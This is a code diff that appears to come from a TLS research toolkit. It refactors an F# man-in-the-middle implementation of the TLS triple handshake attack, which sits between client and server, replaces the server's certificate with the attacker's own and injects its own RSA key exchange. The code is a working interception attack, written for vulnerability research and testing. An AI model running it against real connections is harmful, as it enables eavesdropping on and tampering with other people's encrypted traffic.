@@ -27,12 +27,23 @@ open FlexSecrets
 type Attack_TripleHandshake =
     class
 
-    static member runMITM (accept, server_name:string, chain:Cert.chain, sk:RSAKey.sk, ?port:int) : unit =
+    static member runMITM (attacker_server_name:string, attacker_cn:string, attacker_port:int, server_name:string, ?port:int) : unit =
         let port = defaultArg port FlexConstants.defaultTCPPort in
+        match Cert.for_signing FlexConstants.sigAlgs_ALL attacker_cn FlexConstants.sigAlgs_RSA with
+        | None -> failwith (perror __SOURCE_FILE__ __LINE__ (sprintf "Private key not found for the given CN: %s" attacker_cn))
+        | Some(attacker_chain,_,_) -> Attack_TripleHandshake.runMITM(attacker_server_name,attacker_chain,attacker_port,server_name,port)
+
+    static member runMITM (attacker_server_name:string, attacker_chain:Cert.chain, attacker_port:int, server_name:string, ?port:int) : unit =
+        let port = defaultArg port FlexConstants.defaultTCPPort in
+        let attacker_cn =
+            match Cert.get_hint attacker_chain with
+            | None -> failwith (perror __SOURCE_FILE__ __LINE__ "Could not parse given certficate")
+            | Some(cn) -> cn
+        in
 
         // Start being a server
         printf "Please connect to me, and I will attack you.\n";
-        let sst,_ = FlexConnection.serverOpenTcpConnection("0.0.0.0",port=6666) in
+        let sst,_ = FlexConnection.serverOpenTcpConnection(attacker_server_name,cn=attacker_cn,port=attacker_port) in
         let sst,nsc,sch = FlexClientHello.receive(sst) in
 
         // Start being a client
@@ -50,13 +61,13 @@ type Attack_TripleHandshake =
 
         // Discard the real certificate of the server and inject ours instead
         let cst,cnsc,ccert = FlexCertificate.receive(cst,Client,nsc) in
-        let sst,snsc,scert = FlexCertificate.send(sst,Server,chain,nsc) in
+        let sst,snsc,scert = FlexCertificate.send(sst,Server,attacker_chain,nsc) in
 
         // Forward the server hello done
         let cst,sst,shdpayload  = FlexHandshake.forward(cst,sst) in
 
         // Discard the real the client key exchange and inject ours instead
-        let sst,snsc,sfcke  = FlexClientKeyExchange.receiveRSA(sst,snsc,sch,sk=sk) in
+        let sst,snsc,sfcke  = FlexClientKeyExchange.receiveRSA(sst,snsc,sch) in
         let cst,cnsc,cfcke  = FlexClientKeyExchange.sendRSA(cst,cnsc,sch) in
 
         // Forward the client CCS
